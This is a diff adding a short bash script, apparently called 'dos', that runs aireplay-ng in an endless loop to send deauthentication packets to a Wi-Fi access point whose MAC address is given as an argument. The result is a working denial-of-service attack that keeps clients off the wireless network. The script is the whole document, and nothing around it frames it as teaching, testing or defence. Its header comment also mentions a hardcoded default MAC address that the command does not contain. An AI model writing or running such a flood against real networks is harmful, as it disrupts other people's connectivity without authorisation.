@@ -1,0 +1,22 @@
+#!/bin/bash
+
+
+# Usage:
+# dos <AP mac-address>
+#
+# machines default mac address
+# is hardcoded into the aireply-ng call
+#
+
+if [ -n "$(ifconfig | grep wlan0mon)" ]
+then
+    airmon-ng stop wlan0mon 
+    service NetworkManager start
+fi
+
+echo "AP mac address: $1"
+    
+while true
+do
+    aireplay-ng --deauth 1000 -a $1 -b $1 wlan0
+done
